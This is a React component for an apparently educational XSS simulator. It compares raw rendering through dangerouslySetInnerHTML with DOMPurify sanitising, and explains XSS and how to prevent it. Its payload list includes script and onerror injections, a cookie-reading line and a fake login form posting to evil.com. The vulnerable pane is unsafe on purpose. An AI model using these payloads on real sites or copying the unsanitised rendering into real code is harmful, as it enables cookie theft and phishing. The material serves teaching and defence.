import { useState, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import DOMPurify from 'dompurify';
import { staggerContainer, staggerItem } from '../animations/variants';
import { HiCode, HiShieldCheck, HiShieldExclamation, HiExclamation, HiLightBulb, HiPlay, HiTrash, HiChevronDown, HiChevronUp } from 'react-icons/hi';

const payloads = [
  { label: 'Script Injection', payload: '<script>alert("XSS Attack!")</script>', desc: 'Injects JavaScript alert' },
  { label: 'Image Onerror', payload: '<img src="x" onerror="alert(\'Hacked!\')">', desc: 'Uses broken image to trigger JS' },
  { label: 'Styled Content', payload: '<h1 style="color:red;font-size:50px;">HACKED!</h1>', desc: 'Injects styled HTML' },
  { label: 'Cookie Steal', payload: '<img src="x" onerror="document.title=document.cookie">', desc: 'Demonstrates cookie theft' },
  { label: 'Phishing Form', payload: '<form action="https://evil.com"><input placeholder="Enter password"><button style="background:red;color:white;padding:5px 10px;border:none;cursor:pointer">Login</button></form>', desc: 'Injects fake login form' }
];

const XSSSimulator = () => {
  const [input, setInput] = useState('');
  const [showInfo, setShowInfo] = useState(true);
  const [typing, setTyping] = useState(false);
  const ref = useRef(null);

  const type = (text) => {
    setInput(''); setTyping(true);
    let i = 0;
    const iv = setInterval(() => {
      if (i < text.length) { setInput(text.substring(0, i + 1)); i++; }
      else { clearInterval(iv); setTyping(false); }
    }, 25);
  };

  return (
    <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
      
      <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="text-center mb-8 sm:mb-10">
        <div className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-red-500/8 border border-red-500/15 text-red-400 text-xs font-medium mb-4">
          <HiExclamation /> Educational Purpose Only
        </div>
        <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold text-white mb-2">
          XSS Attack <span className="bg-gradient-to-r from-red-400 to-orange-400 bg-clip-text text-transparent">Simulator</span>
        </h1>
        <p className="text-sm text-slate-400 max-w-xl mx-auto">
          See how Cross-Site Scripting attacks work and learn to prevent them. Compare vulnerable vs. secure rendering.
        </p>
      </motion.div>

      <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.15 }}
        className="mb-6 p-4 sm:p-5 rounded-2xl bg-[rgba(12,12,32,0.6)] border border-white/[0.06]">
        <div className="flex items-center gap-2 mb-3">
          <HiCode className="text-cyan-400" />
          <h2 className="text-sm font-semibold text-white">Enter HTML / JavaScript</h2>
        </div>
        <textarea ref={ref} value={input} onChange={e => setInput(e.target.value)}
          placeholder="Try typing HTML/JS code here..."
          className="w-full h-28 sm:h-32 p-3 rounded-xl bg-black/40 border border-white/[0.06] text-cyan-300 font-mono text-xs sm:text-sm focus:border-cyan-500/40 focus:outline-none resize-none transition-colors"
          spellCheck="false" id="xss-input" />

        <div className="mt-3">
          <p className="text-[0.6875rem] text-slate-500 mb-2">Quick Payloads:</p>
          <div className="flex flex-wrap gap-1.5">
            {payloads.map((p, i) => (
              <button key={i} onClick={() => type(p.payload)} disabled={typing}
                className="px-2.5 py-1 rounded-md text-[0.6875rem] font-medium border border-white/[0.06] text-slate-300 hover:border-red-500/25 hover:text-red-400 transition-all disabled:opacity-40 flex items-center gap-1">
                <HiPlay className="text-[9px]" /> {p.label}
              </button>
            ))}
            <button onClick={() => setInput('')}
              className="px-2.5 py-1 rounded-md text-[0.6875rem] font-medium border border-white/[0.06] text-slate-400 hover:text-slate-200 transition-all flex items-center gap-1">
              <HiTrash /> Clear
            </button>
          </div>
        </div>
      </motion.div>

      <div className="grid md:grid-cols-2 gap-4 sm:gap-5 mb-6">
        
        <motion.div initial={{ opacity: 0, x: -16 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.25 }}
          className="rounded-2xl overflow-hidden border border-red-500/15">
          <div className="px-4 sm:px-5 py-3 bg-red-500/[0.06] border-b border-red-500/15 flex items-center gap-2">
            <HiShieldExclamation className="text-red-400" />
            <h3 className="text-sm font-semibold text-red-400">⚠️ Vulnerable</h3>
            <span className="ml-auto badge badge-danger">UNSAFE</span>
          </div>
          <div className="p-4 sm:p-5 bg-[rgba(12,12,32,0.5)] min-h-[140px] sm:min-h-[180px]">
            <p className="text-[0.6875rem] text-slate-500 font-mono mb-2">// dangerouslySetInnerHTML (NEVER!)</p>
            {input ? <div className="text-sm text-slate-300 break-all" dangerouslySetInnerHTML={{ __html: input }} />
              : <p className="text-slate-600 italic text-sm">Enter HTML/JS above…</p>}
          </div>
        </motion.div>

        <motion.div initial={{ opacity: 0, x: 16 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.25 }}
          className="rounded-2xl overflow-hidden border border-emerald-500/15">
          <div className="px-4 sm:px-5 py-3 bg-emerald-500/[0.06] border-b border-emerald-500/15 flex items-center gap-2">
            <HiShieldCheck className="text-emerald-400" />
            <h3 className="text-sm font-semibold text-emerald-400">✅ Secure</h3>
            <span className="ml-auto badge badge-success">SAFE</span>
          </div>
          <div className="p-4 sm:p-5 bg-[rgba(12,12,32,0.5)] min-h-[140px] sm:min-h-[180px]">
            <p className="text-[0.6875rem] text-slate-500 font-mono mb-2">// Sanitized with DOMPurify</p>
            {input ? <div className="text-sm text-slate-300 break-all" dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(input) }} />
              : <p className="text-slate-600 italic text-sm">Enter HTML/JS above…</p>}
          </div>
        </motion.div>
      </div>

      {input && (
        <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }}
          className="mb-6 p-4 sm:p-5 rounded-2xl bg-[rgba(12,12,32,0.6)] border border-white/[0.06]">
          <h3 className="text-sm font-semibold text-white mb-3">🔍 Code Analysis</h3>
          <div className="grid md:grid-cols-2 gap-3">
            <div><p className="text-xs text-red-400 mb-1.5 font-semibold">Raw Input:</p><div className="code-block !text-red-300 !text-xs">{input}</div></div>
            <div><p className="text-xs text-emerald-400 mb-1.5 font-semibold">Sanitized:</p><div className="code-block !text-emerald-300 !text-xs">{DOMPurify.sanitize(input) || '(empty — malicious content removed)'}</div></div>
          </div>
        </motion.div>
      )}

      <motion.div initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}
        className="rounded-2xl bg-[rgba(12,12,32,0.6)] border border-white/[0.06] overflow-hidden mb-8">
        <button onClick={() => setShowInfo(!showInfo)}
          className="w-full px-4 sm:px-5 py-4 flex items-center justify-between hover:bg-white/[0.02] transition-colors">
          <h3 className="text-sm font-semibold text-white flex items-center gap-2"><HiLightBulb className="text-yellow-400" /> Understanding XSS Attacks</h3>
          {showInfo ? <HiChevronUp className="text-slate-400" /> : <HiChevronDown className="text-slate-400" />}
        </button>
        <AnimatePresence>
          {showInfo && (
            <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.25 }} className="overflow-hidden">
              <motion.div variants={staggerContainer} initial="initial" animate="animate" className="p-4 sm:p-5 pt-1 grid md:grid-cols-2 gap-4">
                {[
                  { title: '🚨 What is XSS?', text: 'Cross-Site Scripting lets attackers inject malicious scripts into web pages viewed by other users, stealing cookies, tokens, or data.', color: 'red' },
                  { title: '⚛️ React\'s Protection', text: 'React escapes values in JSX automatically. Only dangerouslySetInnerHTML bypasses this — never use it with untrusted input.', color: 'blue' },
                  { title: '❓ Why It Happens', text: 'XSS occurs when websites include untrusted user input in output without validation or escaping. Browsers can\'t tell the difference.', color: 'orange' },
                  { title: '🛡️ DOMPurify', text: 'DOMPurify parses HTML and removes dangerous elements like <script>, onerror, onclick — keeping safe HTML intact.', color: 'emerald' }
                ].map((card, i) => (
                  <motion.div key={i} variants={staggerItem} className={`p-3.5 rounded-xl bg-${card.color}-500/[0.04] border border-${card.color}-500/10`}>
                    <h4 className={`text-xs font-semibold text-${card.color}-400 mb-1.5`}>{card.title}</h4>
                    <p className="text-xs text-slate-300 leading-relaxed">{card.text}</p>
                  </motion.div>
                ))}
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </div>
  );
};

export default XSSSimulator;
